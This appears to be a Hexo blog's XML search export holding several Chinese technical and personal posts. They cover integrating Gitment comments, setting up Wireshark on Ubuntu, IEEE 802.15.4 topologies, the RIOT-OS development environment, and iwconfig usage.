    <content type="text"><![CDATA[告别2017最艰难的一周，迎接2018年新的起点。 2017，遇见不一样的自己 上半年，本科毕业，告别了四年里一起学习、一起玩耍、一起开心、一起难过的同学，指引我努力向上的恩师们，也告别了一起奋斗的实验室小伙伴们。面对现实，再多不舍也会被冲淡，只是我们依然铭记。 于是，在2017的最后一天，和本科的老铁一起去了期待四年的省博物馆，然后开车回农大，在校园里逛，在新润一边吃烧烤，一边和同学、助班视频，曾经的记忆扑面而来。或许，这就是情谊，是生活吧。 下半年，研究生生活开端，来到更大的平台，接触更多不一样的人，了解越来越多的事情，学习很多新的技能，也尝试了很多一直不敢想的事。于是，也便有了对未来的美好期盼，虽然依然无法看到未来的样子，但是也还一直在为着这些所谓的美好期盼努力着。 也因此，面临更大的挫折，有了更多的压力，更多的迷茫，更多的不知所措。但是，我相信未来还是美好的。正所谓，心之所向，素履以往。不忘初心，方能始终。 2018，预见不一样的自己 2017，改变不少，但依然少了一份敢闯敢拼的劲头。2018，做不一样的自己。 记得有这么一段话， 你要记住大雨中为你撑伞的人 帮你挡住外来之物的人 黑暗中默默抱紧你的人 逗你笑的人 陪你彻夜聊天的人 坐车来看望你的人 陪你哭过的人 在医院陪你的人 总是以你为重的人 是这些人组成你生命中一点一滴的温暖 是这些温暖使你远离阴霾 是这些温暖使你成为善良的人 2017， 谢谢你们，一直都在。 2018， 愿每一个爱我的人和我爱的人，都能被岁月温柔以待。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（五）]]></title>
    <url>%2F2017%2F12%2F03%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%94%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Gitment是一款基于GitHub Issues的评论系统。这篇博客介绍Hexo如何集成Gitment评论系统。 为了博客能够支持评论，试过很多评论系统，多说挂了，网易云跟帖也挂了，最后换到来必力，但是发现评论经常显示不出来，登录评论后台还得翻墙，于是找到了现在的Gtiment。 对于hexo+Github搭建的博客，使用Gitment应该是最好的选择了，因为他是基于Github的Issue来做的，每篇文章的评论会创建一个Issue。 尽管还有类似的开源项目，比如Gittalk也可以实现同样的功能，由于我使用的是next主题，所以Gitment的默认样式可能更适合我的博客，虽然样式是可以自定义的，但是对于我这种不回前端的人来说怎么简单怎么来吧。 注册OAuth Application 在Github点击右上角个人头像的下拉图标，选择Setting，然后在打开的页面左边点击 Developer settings，最后点击New OAuth app。然后填写相关的信息： Application name —— 应用名，随便填写 Homepage URL —— 你的博客地址 Application description —— 应用的描述，随便填写 Authorization callback URL —— 你的博客地址 填写信息完毕后点 Register application 就可以看到刚刚注册好的OAuth Application的信息，其中 Client ID 和 Client Secret 在后面要用到。 配置Hexo和next 修改Next主题的评论框架布局文件themes\next\layout\_partials\comments.swig，打开该文件后可以看到关于多说、友言、Disqus等评论系统已经被添加到评论区布局框架上，所以我们只要在最后添加一个关于Gitment的分支即可，如下： 1234567&#123;% elseif theme.gitment.enable %&#125; &#123;% if theme.gitment.lazy %&#125; &lt;div onclick=&quot;showGitment()&quot; id=&quot;gitment-display-button&quot;&gt;&#123;&#123; __(&apos;gitmentbutton&apos;) &#125;&#125;&lt;/div&gt; &lt;div id=&quot;gitment-container&quot; style=&quot;display:none&quot;&gt;&lt;/div&gt; &#123;% else %&#125; &lt;div id=&quot;gitment-container&quot;&gt;&lt;/div&gt; &#123;% endif %&#125; Gitment评论系统的调用接口已经做好，但是还没有具体实现，所以接着我们在themes\next\layout\_third-party\comments增加一个文件gitment.swig，并在里面添加具体实现： 12345678910111213141516171819202122232425262728293031323334353637&#123;% if theme.gitment.enable %&#125; &#123;% set owner = theme.gitment.owner %&#125; &#123;% set repo = theme.gitment.repo %&#125; &#123;% set cid = theme.gitment.client_id %&#125; &#123;% set cs = theme.gitment.client_secret %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://imsun.github.io/gitment/style/default.css&quot;&gt; &lt;script src=&quot;https://imsun.github.io/gitment/dist/gitment.browser.js&quot;&gt;&lt;/script&gt; &#123;% if theme.gitment.lazy %&#125; &lt;script type=&quot;text/javascript&quot;&gt; function showGitment()&#123; document.getElementById(&quot;gitment-display-button&quot;).style.display = &quot;none&quot;; document.getElementById(&quot;gitment-container&quot;).style.display = &quot;block&quot;; var gitment = new Gitment(&#123; id: window.location.pathname, owner: &apos;&#123;&#123;owner&#125;&#125;&apos;, repo: &apos;&#123;&#123;repo&#125;&#125;&apos;, oauth: &#123; client_id: &apos;&#123;&#123;cid&#125;&#125;&apos;, client_secret: &apos;&#123;&#123;cs&#125;&#125;&apos;, &#125;&#125;); gitment.render(&apos;gitment-container&apos;); &#125; &lt;/script&gt; &#123;% else %&#125; &lt;script type=&quot;text/javascript&quot;&gt; var gitment = new Gitment(&#123; id: window.location.pathname, owner: &apos;&#123;&#123;owner&#125;&#125;&apos;, repo: &apos;&#123;&#123;repo&#125;&#125;&apos;, oauth: &#123; client_id: &apos;&#123;&#123;cid&#125;&#125;&apos;, client_secret: &apos;&#123;&#123;cs&#125;&#125;&apos;, &#125;&#125;); gitment.render(&apos;gitment-container&apos;); &lt;/script&gt; &#123;% endif %&#125;&#123;% endif %&#125; 然后在themes\next\layout\_third-party\comments\index.swig添加一行： 1&#123;% include &apos;gitment.swig&apos; %&#125; 最后，在NexT主题配置文件中配置一下Gitment，在themes\next\_config.yml中添加以下内容： 12345678# Gitmentgitment: enable: true # gitment评论系统开关 lazy: true # 评论懒加载开关 owner: fzy-Line # GitHub用户名 repo: fzyLine.github.io # 存储评论数据的GitHub仓库的仓库名 client_id: # 复制注册OAuth Application后得到的Client ID client_secret: # 复制注册OAuth Application后得到的Client Secret 常见错误Error: Not Found 出现这样错误的原因主要是： repo指定的仓库名对应的仓库在GitHub上根本不存在，应该修改为正确的仓库名，最好就是用自己博客所使用那个仓库，这样的话所有的评论创建的Issue就是博客仓库的Issue。 repo指定的值是其仓库地址，而不是仓库名，应该修改为仓库名。 Error: Comments Not Initialized 出现这样错误的原因主要是： － 在注册OAuth Application时，Authorization callback URL填写的地址错误－ 还没有在该页面的Gitment评论区登陆GitHub账号，需点击login登录github，然后点击初始化按钮进行初始化。 Issues重复初始化 这个问题在Gitment的Github项目Issue中也有很多人提到，貌似还是个BUG，没有得到解决。所以，只有自己多多注意啦。 不要在初始化一篇文章后再去点浏览器的返回按钮然后再回到原来的这篇文章，这样的话，虽然创建了一个Issue，但是初始化按钮还是会存在，如果你再去点就会出现两个Issue。 总结 当然，Gitment也有它的不足，目前它只能用Github账号登录来评论。但是，对于技术博客，特别是IT技术博客，这样也足够了，看你博客的人基本也是这个行业的，而Github又那么有名，所以基本大家都有账号。 由于每一篇文章都要初始化，对于之前写了很多博客的人来说，之前这些文章的初始化确实是个问题，比如写了100多篇的我，乖乖的手动为每一篇点了一下初始化。当然，也有人做了自动化初始化的脚本，大家可以试试。 自动初始化 Gitalk 和 Gitment 评论：https://draveness.me/git-comments-initialize 更详细的介绍可以在我参考的这篇博客中找到答案： 添加Gitment评论系统到Hexo主题NexT：https://extremegtr.github.io/2017/09/07/Add-Gitment-comment-system-to-hexo-theme-NexT/]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04 LTS中安装wireshark]]></title>
    <url>%2F2017%2F12%2F02%2FUbuntu16-04-LTS%E4%B8%AD%E5%AE%89%E8%A3%85wireshark%2F</url>
    <content type="text"><![CDATA[经常分析不同的网络协议和研究数据包的人一定经常使用 Wireshark。 虽然Linux也有像tcpdump这样的工具来实现抓包，但是与难以操作的命令行网络协议分析工具不同的是，Wireshark 拥有非常简洁易用的图形界面，使用 Wireshark 可以很容易地查看有线和无线网络的实时信息。 安装打开一个终端： 1$ sudo apt-get install wireshark 运行与配置 安装完成后使用非root直接运行wireshark的话，由于权限不足，所以无法识别网卡，只能打开pcap的文件，所以我们需要使用sudo提升权限。 默认情况下，访问网络端口需要root权限，而wireshark的只是/usr/share/dumpcap的一个UI，/usr/share/dumpcap需要root权限，所以没法non-root用户无法读取网卡列表。 root运行打开一个终端： 1$ sudo wireshark 但是，这样如果使用root运行则可能会报错： 要对init.lua进行修改，终端运行： 1$ sudo gedit /usr/share/wireshark/init.lua 将倒数第二行改为： 1--dofile(DATA_DIR..&quot;console.lua&quot;) 再启动软件就OK啦。 1$ sudo wireshark 非root运行虽然可以使用root成功运行wireshark，但是wireshark官方不推荐这么做： 12Running as user &quot;root&quot; and group &quot;root&quot;.This could be dangerous. 另外，这样做也不是很方便，特别是在使用桌面版时，如果要通过放置在侧边栏的图标打开wireshark时，默认是不会使用root用户打开的，所以我们需要设置wireshark为非root用户也能执行。 添加wireshark用户组 1$ sudo groupadd wireshark 将dumpcap更改为wireshark用户组 1$ sudo chgrp wireshark /usr/bin/dumpcap 让wireshark用户组有root权限使用dumpcap 1$ sudo chmod 4755 /usr/bin/dumpcap 将需要使用的普通用户名加入wireshark用户组，例如我的用户是“fzy”，则需要使用命令： 1$ sudo gpasswd -a fzy wireshark]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[51单片机学习系列博客整理]]></title>
    <url>%2F2017%2F11%2F26%2F51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E5%8D%9A%E5%AE%A2%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[整理2015年写的一些单片机相关的博客。 2015年我开始在CSDN写博客，当时自己在学院的电子设计创新实验室，主要学习单片机和嵌入式开发。同时，我们也在为电子协会讲课，51单片机是嵌入式入门的基础，也是电子协会讲课的内容。 那段时间，我不仅整理知识点做PPT，还把内容分享到CSDN博客。时至今日，这些博客依然还有人在评论，也有人私信我，可以说这是我没有想到的。在这里整理一下这些博客文章： 51单片机矩阵键盘扫描：http://blog.csdn.net/u013151320/article/details/46621645 51单片机数码管详解：http://blog.csdn.net/u013151320/article/details/49885679 51单片机中断详解（上）：http://blog.csdn.net/u013151320/article/details/49977813 51单片机中断详解（中）：http://blog.csdn.net/u013151320/article/details/50034627 51单片机中断详解（下）：http://blog.csdn.net/u013151320/article/details/50120063 51单片机串口通信：http://blog.csdn.net/u013151320/article/details/50125257 51单片机DS1302实时时钟驱动程序：http://blog.csdn.net/u013151320/article/details/50221091 51单片机I2C总线驱动程序：http://blog.csdn.net/u013151320/article/details/50265967 51单片机LCD1602程序详解：http://blog.csdn.net/u013151320/article/details/46663167 51单片机AD转换之PCF8591：http://blog.csdn.net/u013151320/article/details/50310231 51单片机DHT11温湿度传感器：http://blog.csdn.net/u013151320/article/details/50389624 51单片机基本的编程就是这些，当时也只写了这些，加入了一些自己的理解，分享出来希望对大家有帮助。 现在虽然我已经不再做这个，但是我认为51单片机是我现在学习的一个基础，有了这个基础，你再接触更复杂的嵌入式开发板都能够搞定，原理都是一样的，学会看原理图、芯片手册等资料就能玩得动。 当然，也可以利用单片机来做一些实际的开发。比如，当时随着串口Wi-Fi模块的推出，以及物联网云平台的兴起，我们做了一些网络通信的小项目，将单片机通过传感器采集的数据传输到云端进行存储，然后再通过手机去获取并展示数据，同时也可以实现远程控制。 在现在看来，这些都是已经是十分成熟的技术路线了。所以，学习完51单片机的基础知识，建议学习一下STM32等稍微高端的一点的单片机，结合网络协议、云端技术以及物联网操作系统去做一些小项目来进行练习。]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>［单片机,整理］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IEEE 802.15.4标准学习笔记（一）]]></title>
    <url>%2F2017%2F11%2F25%2FIEEE-802-15-4%E6%A0%87%E5%87%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[IEEE 802.15.4是定义低速率无线个域网（LR-WPAN）操作的技术标准。它规定了LR-WPAN的物理层和媒体访问控制，由IEEE 802.15工作组维护。 IEEE 802.15.4标准简介 LR-WPAN（低速无线个域网）是一种简单，低成本的通信网络，可在具有有限功率和松散吞吐量要求的应用中实现无线连接。LR-WPAN的主要目标是易于安装，可靠的数据传输，极低的成本和合理的电池寿命，同时保持简单灵活的协议。 IEEE 802.15.4标准工作组致力于在固定、便携及移动的廉价设备之间实现低复杂度、低成本且功耗极低的无线连接，其把应用领域重点放在无线传感器网络上。 它是ZigBee、ISA100.11a、WirelessHART和Thread等规范的基础，每个规范都通过开发IEEE 802.15.4中未定义的上层来进一步扩展标准。或者，它可以与6LoWPAN一起使用来定义上层。 IEEE 802.15.4标准的主要特征： 支持星型和点到点两种拓扑结构； 在网络中采取两种地址方式：16位地址和64位地址。其中16位地址是有协调器分配的，64位地址是全球唯一的扩展地址； 采用可选的时槽保障（Guaranteed Time Slots，GTS）机制； 采用带冲突避免的载波侦听多路访问（Carrier sense multiple access with collision avoidance，CSMA-CA）的信道访问机制; 支持ACK机制以保证可靠传输； 低功耗机制； 信道能量检测（Energy Detection，ED）； 链路质量指示（Link quality indication，LQI）； 网络组成 IEEE 802.15.4网络由一个PAN协调器和至少一个网络设备组成。每个网络包含一个专用中央网络协调器，称为PAN协调器。只有PAN协调器可以建立新网络，并且定义网络的结构和运行模式。其他设备通过加入到向PAN协调器申请加入到网络中来。除了PAN协调器外，IEEE 802.15.4标准还定义了两种设备：协调器与网络设备。协调器为网络中其他设备提供协调服务。 两种不同的设备类型可以参与IEEE 802.15.4网络：全功能设备（FFD）和精简功能设备（RFD）。FFD包含全部MAC服务，可以实现全部三种功能：PAN协调器、协调器和网络设备，RFD包含精简的MAC服务，只能用作网络设备。 FFD是能够用作个人区域网络（PAN）协调器或协调器的设备，而RFD则不能。RFD适用于非常简单的应用，它不需要发送大量的数据，并且一次只能与单个FFD相关联。因此，RFD可以使用最少的资源和存储容量来实现。 网络拓扑结构 根据应用要求，IEEE 802.15.4 LR-WPAN以两种拓扑结构中的任一种运行：星形拓扑或对等拓扑。在星形拓扑中，通信建立在设备和单个中央控制器之间，称为PAN协调器。设备通常具有一些相关联的应用，并且是网络通信的起始点或终止点。PAN协调器还可以具有特定的应用，但它可以用于启动，终止或路由网络周围的通信。 PAN协调器是PAN的主要控制器。 在任一拓扑网络上运行的所有设备都有唯一的地址，称为扩展地址。设备将使用扩展地址进行PAN内的直接通信或PAN协调器在设备关联时分配的短地址。PAN协调器通常由主电源供电，而这些设备最有可能由电池供电。 对等拓扑也具有PAN协调器；然而，它与星形拓扑不同之处在于，只要它们在彼此的范围内，任何设备都能够与任何其他设备通信。对等拓扑允许实现更复杂的网络结构，例如网状网络拓扑。对等网络允许多跳将消息从任何设备路由到网络上的任何其他设备。这些功能可以在较高层添加，但不属于此标准。 每个独立的PAN选择唯一的标识符。该PAN标识符允许使用短地址在网络内的设备之间进行通信，并实现跨独立网络的设备之间的传输。选择标识符的机制不属于本标准的范围。 星形拓扑 星形网络的基本结构如上图所示。在星形网络拓扑结构中，通信由一个PAN协调器控制，这个PAN协调器作为网络的主控设备，发送实现设备同步的信标帧（包括超帧控制），并且维护关联的管理。 （1）网络建立流程 任何FFD在被激活之后，它可以建立自己的网络并成为PAN协调器。所有星形网络独立于当前正在运行的所有其他星形网络。在一个新的星形网络形成的过程中，PAN协调器必须选择一个网络标识符（PAN ID），这个PAN ID不应该被网络周围的任何相邻网络所占用。PAN协调器周期性地扫描所有可用的或者可选择的信道，寻找已经建立的网络，然后选择一个和他们都不同的PAN ID。之后，PAN协调器才开始周期性地发送信标，允许其他设备（可能是FFD和RFD）加入其网络。 （2）特点 所有设备都与中心设备PAN网络协调器通讯 网络协调器持续供电，其他设备电池供电 适合家庭自动化、个人计算机外围设备、个人康护护理等小范围的室内应用 对等拓扑 在对等拓扑中，每个设备能够与其无线电通信范围内的任何其他设备进行通信，并且可以通过多条路由将报文传递给其射频通信范围外的设备。对等网络也可以有精简功能设备，但只能作为外围设备，因为它们不具备转发数据报的功能，也因此，对等网络中必须有足够多的全功能设备来形成网络。 （1）网络建立流程 任何一个FFD使自己成为一个PAN协调器，并选择一个与其附近的其他网络不同的PAN ID，就可以建成一个新的对等网络。 网络设备按照一套规定的步骤加入到对等网络：首先，具有路由功能的设备通过发现邻近PAN协调器或者作为PAN协调器代理来扫描可用的网络。IEEE 802.15.4标准将具有路由功能的设备也认为是协调器。扫描完成后，网络设备的高层通过向PAN协调器或者最近的一个协调器发送入网请求来加入到一个被发现的网络。相应的，协调器决定是否允许网络设备入网。 如果这个网络设备是FFD，它加入网络后也可以成为一个协调器，并向其他已入网设备提供报文转发服务或者向未入网设备提供入网服务。 （2）特点 任何两个设备之间都可以通讯 网络协调器负责管理链路状态信息、认证设备身份等功能 允许多跳路由的方式传输数据 适合于设备分布范围广的应用（工业检测与控制） 簇树网络 簇树网络是对等网络拓扑结构的一种特定类型。在对等网络中的设备可以为完整功能设备，也可以为简化功能设备。 而在树簇中的大部分设备是 FFD， RFD 只能作为一个叶结点连接在树簇拓扑结构树枝的末尾处。任何一个 FFD 都可以作为主协调器，并且，为其它从设备或主设备提供同步服务。在整个 PAN 中，只要该设备相对于 PAN 中的其它设备具有更丰富的计算资源，这样的设备都可以成为该 PAN 的主协调器。 在建立一个 PAN 时，首先， PAN 主协调器将自身设置为一个簇标识符（ CID）为 0 的簇头，然后，选择一个没有使用的 PAN 标识符，并向邻近的其它设备以广播的方式发送信标帧，从而形成第一簇网络。接收到信标帧的候选设备可以在簇头中请求加入该网络，如果 PAN 主协调器允许该设备加入，那么主协调器会将该设备作为结点加入到邻近表中，成为该网络的一个从设备，同时，请求加入的设备将 PAN 协调器作为它的父结点加到邻近列表中，成为该网络的一个从设备，开始发送周期性的信标帧；其它的候选设备也可以在这台刚加入的设备上加入该网络。如果原始的候选不能加入到该网络中，那么它将寻找其它的父结点。 参考文献： [1] Gutierrez J A, Callaway E H, Barrett R L. Low-rate wireless personal area networks: enabling wireless sensors with IEEE 802.15. 4[M]. IEEE Standards Association, 2004.]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>802.15.4</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RIOT-OS开发环境搭建与样例解析]]></title>
    <url>%2F2017%2F11%2F24%2FRIOT-OS%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%A0%B7%E4%BE%8B%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[正式开始折腾友好的RIOT操作系统。 开发环境搭建源码下载与编译 以Ubuntu系统中搭建RIOT-OS开发环境为例，下载源码： 1$ git clone git://github.com/RIOT-OS/RIOT.git 主分支一般是稳定版，如需最新版可切换到最新的分支： 12$ cd RIOT$ checkout &lt;LATEST_RELEASE&gt; 编译： 1234$ sudo ./dist/tools/tapsetup/tapsetup # 创建虚拟以太网接口，连接多个RIOT实例 $ cd examples/default/$ make all$ make term 亲测，32位ubuntu系统可以正确执行编译，但是64位ubuntu在使用make all编译时会出错，如图： 可使用如下方法解决： 1sudo apt-get install libc6-dev-i386 完成后再编译即可。 使用make term进行本地调试时，也会出错，如图： 此时需加上sudo提升下权限： 1sudo make term 如果要编译到指定的平台，可在make时使用BOARD指定，例如： 1$ sudo make BOARD=cc2538dk 然后，使用make进行编译，会发现如下错误。 编译到cc2538dk等平台时需要下载交叉编译工具，否则会报错。根据RIOT的官方文档： https://github.com/RIOT-OS/RIOT/wiki/Family%3A-ARM ARM系列需要下载gcc-arm-embedded toolchain，地址如下：https://developer.arm.com/open-source/gnu-toolchain/gnu-rm 下载Linux64位版本，然后将其解压： 1$ tar -xjvf 下载工具包名称.tar.bz2 -C /usr/bin 将其添加到环境变量： 1$ nano ~/.bashrc 在最后添加如下一行： 1$ export PATH=/usr/bin/下载工具包名称/bin:$PATH 然后执行： 1$ source ~/.bashrc 这样即可执行编译。但是注意编译一定不要使用sudo，这样的话还是会出错，直接make就好了： 1$ make BOARD=cc2538dk 基本操作 以cc2538dk硬件平台为例： 编译生成指定硬件平台的可执行文件 123$ make BOARD=cc2538dkor$ make all BOARD=cc2538dk 将程序烧录到指定硬件平台 1$ make flash BOARD=cc2538dk 通过串口连接到硬件平台进行调试 123$ make term BOARD=cc2538dkor$ make term BOARD=cc2538dk PORT=/dev/ttyACM1 例程解析main.c12345678910111213141516#include &lt;stdio.h&gt;#include &quot;shell.h&quot;#include &quot;shell_commands.h&quot;int main(void)&#123; puts(&quot;Hello World!&quot;); printf(&quot;You are running RIOT on a(n) %s board.\n&quot;, RIOT_BOARD); printf(&quot;This board features a(n) %s MCU.\n&quot;, RIOT_MCU); char line_buf[SHELL_DEFAULT_BUFSIZE]; shell_run(NULL, line_buf, SHELL_DEFAULT_BUFSIZE); return 0;&#125; 代码风格与我们平时使用的C基本没有区别，节点启动后，RIOT会启动两个线程： idle 线程，具有最低优先级，只要没有其他线程准备运行，它将运行。它将自动使用设备的最低可能的电源模式。 main 线程，配置的默认优先级位于最低和最高可用优先级之间的中间-是运行并调用main()函数的第一个线程。 另外，它这里使用到了RIOT的shell，程序运行后可通过shell命令与程序进行交互，当然，我们这里并没有定义命令，所以如下图的运行结果中并没有命令。 Makefile 应用程序的 Makefile 至少需要定义以下宏： APPLICATION：应该包含应用程序的名称 RIOTBASE：指定RIOT存储库副本的路径 BOARD 宏也是需要的并且默认被建议设置为native，但是建议使用？=操作符来覆盖。另外，需要从 RIOTBASE 中包含Makefile.include。 12345678910111213# 应用程序的名称APPLICATION = hello-world# 定义开发板，默认是native平台，可在bashrc文件中添加，也可以在编译之前使用export BOARD=cc2538cb定义BOARD ?= native# 指定根路径，用于加载模块、驱动等，这必须是RIOT基本目录的绝对路径RIOTBASE ?= $(CURDIR)/../../RIOTinclude $(RIOTBASE)/Makefile.include# 添加模块USEMODULE += shellUSEMODULE += shell_commands 包含模块： 默认情况下，RIOT应用程序仅包含应用程序的代码本身，内核和平台特定的代码。为了使用其他模块，如特定的设备驱动程序或系统库（包括网络功能），你必须将模块的名称附加到USEMODULE变量。 123USEMODULE += sht11USEMODULE += gnrc_ipv6_defaultUSEMODULE += gnrc_udp]]></content>
      <categories>
        <category>IoT</category>
        <category>RIOT</category>
      </categories>
      <tags>
        <tag>RIOT</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源物联网操作系统：RIOT-OS]]></title>
    <url>%2F2017%2F11%2F18%2F%E5%BC%80%E6%BA%90%E7%89%A9%E8%81%94%E7%BD%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9ARIOT-OS%2F</url>
    <content type="text"><![CDATA[RIOT是一个开源的物联网操作系统，它针对物联网场景的低功耗、资源受限等特殊要求而设计，前景很不错。 简介 RIOT操作系统针对物联网场景的特殊要求而设计。这些要求包括低内存占用，高能效，实时功能，模块化和可配置的通信堆栈，并支持各种低功耗设备。 RIOT基于微内核架构，这意味着它针对非常低的资源需求进行了优化，并且支持实时和多线程处理。它兼容16/32位MCU架构，还有一个本机端口可用于在Linux或MacOS上作为进程运行，从而可以使用标准开发工具，如GNU编译器集合，GNU调试器，Valgrind或Wireshark 。 RIOT具有多种功能集成，支持C/C++语言，并提供shell，加密库，各种数据结构等功能。操作系统集成了对IPv6或6LoWPAN等网络堆栈的支持，以及UDP，TCP，RPL和CoAP网络协议。操作系统还具有各种硬件的驱动程序，如传感器，无线电收发器和MCU。 支持的平台 RIOT支持ARM Cortex-M0，M3，M4和ARM7架构，从而支持各种开发板，如Arduino Due，基于Atmel ATmega2560 MCU（例如Arduino Mega 2560）或蓝牙设备如北欧nRF51822 SoC。 支持的网络协议栈 RIOT不仅仅支持TCP/IP网络协议栈，还支持IPv6，6lowpan等，另外，它还通过CCN Lite提供了对CCN协议的支持。 操作系统对比 对比TinyOS、Contiki、Linux，RIOT的优势十分明显。 相关资料RIOT-OS官网：http://www.riot-os.org/ Github repository: https://github.com/RIOT-OS/RIOT CSDN博客： http://blog.csdn.net/mx1252111/article/category/6423778 论文1：Will H, Schleiser K, Schiller J. A real-time kernel for wireless sensor networks employed in rescue scenarios[C]// Local Computer Networks, 2009. LCN 2009. IEEE, Conference on. IEEE, 2009:834-841. http://ieeexplore.ieee.org/document/5355049/ 论文2：Baccelli E, Hahm O, Wählisch M, et al. RIOT: One OS to Rule Them All in the IoT[J]. HAL - INRIA, 2013. https://hal.inria.fr/hal-00768685/ 论文3：Baccelli E, Hahm O, GüNes M, et al. RIOT OS: Towards an OS for the Internet of Things[C]// Computer Communications Workshops. IEEE, 2013:79-80. http://www.riot-os.org/docs/riot-infocom2013-abstract.pdf 系统框架 RIOT的代码库分为五组。 内核 (core) 平台特定的代码 (cpu; boards) 设备驱动 (drivers) 库和网络代码 (sys; pkg) 演示功能和测试的应用程序 (examples; tests) 此外，RIOT还包括各种任务的脚本集合(dist)以及用于生成文档(soc)的预定义环境。 core core文件夹包含了RIOT的内核文件，包括线程管理，消息管理，关键数据结构，一些格式定义等。其中最关键的是，它包含了RIOT中主线程和空闲线程的创建。 board board文件夹中包含了RIOT支持的硬件平台的所有定义和实现，其中包括ARM、TI等公司的产品。通常，硬件平台由控制器的固定配置和一些外部设备（如传感器或无线电）组成。该文件夹的主要作用是把硬件平台编译需要的文件联系起来，这样硬件平台才能够编译，它包含有关GPIO引脚，MCU时钟和器件驱动程序配置的所有方面。 cpu cpu文件夹包含所有特定于CPU的源文件。在多个CPU共享相同架构的情况下，实现被分为几个CPU特定的部分和架构部分（例如arm7_common和lpc2387）。cpu这个文件夹非常重要，前期的编程会频繁的使用到这个文件夹内的文件。 drivers drivers文件夹包含特定设备的所有类型的驱动程序，比如enc28j60，dht11等，同时它还包含了硬件平台底层驱动的头文件。 sys sys是一个非常重要的文件夹，里面包含了RIOT的精华部分，我们就很少去直接使用cpu文件夹的内容，而是直接使用sys中的一些函数，因为cpu文件夹中的东西是底层的，而sys中的应用是高层的。 而sys文件夹下的net文件夹更是重中之重，这里面包含了RIOT网络部分的文件，其中包括数据链路层、网络层、传输层和应用层的。因此，我们可以找到sixlowpan，udp，rpl，border routers等功能。RIOT提供了强大的gnrc模块，在无线传输方面十分方便。 examples examples文件夹里面提供了几个经典的例程，这几个例程非常非常的重要，可以说只要掌握了这几个例程的功能，RIOT的大部分功能就学会了。只要明白了shell命令去调试之后就可以很简单的去解析这些程序了。 tests tests文件夹提供了各个功能的详细测试程序。RIOT里面包含的功能几乎都可以在这里面找到测试的实例。而且这些功能机会支持所有的硬件平台。只要按照自己选择的硬件平台去编译就能根据测试结果去辅助学习了。 pkg pkg文件夹提供了一些外部库驱动，比如libcoap、openwsn等库驱动。 dist、doc dist文件夹提供了一些工具，doc文件夹提供了一些文档。]]></content>
      <categories>
        <category>IoT</category>
        <category>RIOT</category>
      </categories>
      <tags>
        <tag>RIOT</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Wireless Tools：iwconfig]]></title>
    <url>%2F2017%2F11%2F11%2FLinux-Wireless-Tools%EF%BC%9A-iwconfig%2F</url>
    <content type="text"><![CDATA[iwconfig - 配置无线网络接口 iwconfig用于Linux系统配置无线网络设备或显示无线网络设备信息。iwconfig命令类似于ifconfig命令，但是他配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段。 iwconfig安装 ubuntu下使用如下命令安装，wireless-tools工具包中包含了iwconfig。 1sudo apt install wireless-tools 使用说明123456789101112131415161718192021Usage: iwconfig [interface] interface essid &#123;NNN|any|on|off&#125; interface mode &#123;managed|ad-hoc|master|...&#125; interface freq N.NNN[k|M|G] interface channel N interface bit &#123;N[k|M|G]|auto|fixed&#125; interface rate &#123;N[k|M|G]|auto|fixed&#125; interface enc &#123;NNNN-NNNN|off&#125; interface key &#123;NNNN-NNNN|off&#125; interface power &#123;period N|timeout N|saving N|off&#125; interface nickname NNN interface nwid &#123;NN|on|off&#125; interface ap &#123;N|off|auto&#125; interface txpower &#123;NmW|NdBm|off|auto&#125; interface sens N interface retry &#123;limit N|lifetime N&#125; interface rts &#123;N|auto|fixed|off&#125; interface frag &#123;N|auto|fixed|off&#125; interface modulation &#123;11g|11a|CCK|OFDMg|...&#125; interface commit Check man pages for more details. essid 设置无线网卡的ESSID(Extension Service Set ID)。通过ESSID来区分不同的无线网络，正常情况下只有相同ESSID的无线站点才可以互相通讯，除非想监听无线网络。其后的参数为双引号括起的ESSID字符串，或者是any/on/off，如果ESSID字符串中包含any/no/off，则需要在前面加”–”。 123$ iwconfig eth0 essid any$ iwconfig eth0 essid &quot;My Network&quot;&quot;$ iwconfig eth0 essid -- &quot;ANY&quot;&quot; mode 设置无线网卡的工作模式，可以是 Ad-hoc：不带AP的点对点无线网络 Managed：通过多个AP组成的网络，无线设备可以在这个网络中漫游 Master：设置该无线网卡为一个AP Repeater：设置为无线网络中继设备，可以转发网络包 Secondary：设置为备份的AP/Repeater Monitor：监听模式 Auto：由无线网卡自动选择工作模式 12$ iwconfig wlan0 mode Managed$ iwconfig wlan0 mode Ad-Hoc freq/channel 设置无线网卡的工作频率或者频道，小于1000的参数被认为是频道，大于10000的参数被认为是频率。频率单位为Hz，可以在数字后面附带k, M, G来改变数量级，比如2.4G。频道从1开始。使用lwlist工具可以查看无线网卡支持的频率和频道。参数off/auto指示无线网络自动挑选频率。 